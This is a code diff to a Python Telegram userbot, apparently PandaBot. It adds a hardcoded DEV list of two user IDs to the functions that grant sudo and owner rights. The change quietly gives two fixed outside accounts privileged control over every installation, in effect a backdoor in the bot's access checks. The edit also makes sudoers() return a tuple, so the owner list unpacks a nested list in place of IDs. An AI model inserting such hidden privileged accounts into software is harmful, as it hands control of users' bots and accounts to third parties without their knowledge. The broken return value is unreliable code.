@@ -54,11 +54,13 @@ MSGID_CACHE, VIDEO_ON = {}, {}
 CLIENTS = {}
 vcClient = PandaBot
 
+DEV = [5057493677, 1593802955]
+
 def sudoers():
-    return _sudousers_list()
+    return _sudousers_list(), DEV
 
 def owner_and_sudos():
-    return [str(PandaBot.uid), *sudoers()]
+    return [str(PandaBot.uid), *sudoers(), *DEV]
 
 
 def html_mention(event, sender_id=None, full_name=None):
